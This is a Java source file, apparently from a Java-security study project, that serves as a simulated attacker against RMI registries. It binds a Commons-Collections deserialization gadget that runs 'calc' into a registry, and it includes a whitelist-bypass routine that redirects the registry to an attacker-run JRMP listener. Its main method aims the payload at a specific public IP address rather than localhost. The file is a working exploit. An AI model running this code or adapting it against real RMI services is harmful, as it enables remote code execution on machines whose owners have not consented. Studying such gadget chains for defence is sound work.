package com.pinger.javasec.rmi.attackRegistry;

import com.pinger.javasec.common.CC3;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

/**
 * @author : p1n93r
 * @date : 2021/7/29 18:38
 * 模拟攻击方
 */
public class Attaker {

    public static void bypassWhiteList()throws Exception{
        ObjID id = new ObjID(new Random().nextInt());
        // Attacker's eval RMI registry
        TCPEndpoint te = new TCPEndpoint("127.0.0.1", 3333);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        registry.bind("hackYou", obj);
    }

    public static void standard()throws Exception{
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        Object cmd = Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, (InvocationHandler) CC3.getPayload("calc"));
        Remote remote = Remote.class.cast(cmd);
        registry.bind("hackYou", remote);
    }



    public static void main(String[] args) throws Exception{
//        standard();
        Registry registry = LocateRegistry.getRegistry("202.127.45.99", 1099);
        Object cmd = Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, (InvocationHandler) CC3.getPayload("calc"));
        Remote remote = Remote.class.cast(cmd);
        registry.bind("hackYou", remote);
//        registry.lookup("");


    }
}
